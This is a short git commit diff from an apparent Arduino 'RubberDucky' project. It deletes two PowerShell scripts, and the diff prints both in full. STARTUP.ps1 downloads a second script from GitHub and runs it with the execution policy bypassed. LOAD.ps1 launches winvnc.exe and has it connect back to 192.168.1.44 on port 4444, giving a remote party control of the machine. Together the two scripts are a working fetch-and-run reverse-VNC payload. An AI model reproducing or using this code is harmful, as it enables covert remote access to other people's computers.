3fd4899b408a61e5c84b0a8d5d4fcb3b4cb4cbab
EmaBixD <156678932+EmaBixD@users.noreply.github.com>
2024-09-10 19:53:56 +0200

    Delete client directory

--- client/LOAD.ps1
+++
@@ -1,3 +0,0 @@
-Start-Process -FilePath "winvnc.exe" -ArgumentList "-run"
-Start-Sleep -Seconds 1
-Start-Process -FilePath "winvnc.exe" -ArgumentList "-connect 192.168.1.44::4444"
--- client/STARTUP.ps1
+++
@@ -1,9 +0,0 @@
-$documentsPath = [System.Environment]::GetFolderPath('MyDocuments')
-
-$githubUrl = "https://github.com/EmaBixD/Arduino-RubberDucky/raw/main/client/LOAD.ps1"
-
-$destinationFile = "$documentsPath\EmaDev\LOAD.ps1"
-
-Invoke-WebRequest -Uri $githubUrl -OutFile $destinationFile
-
-powershell -ExecutionPolicy Bypass -File $destinationFile
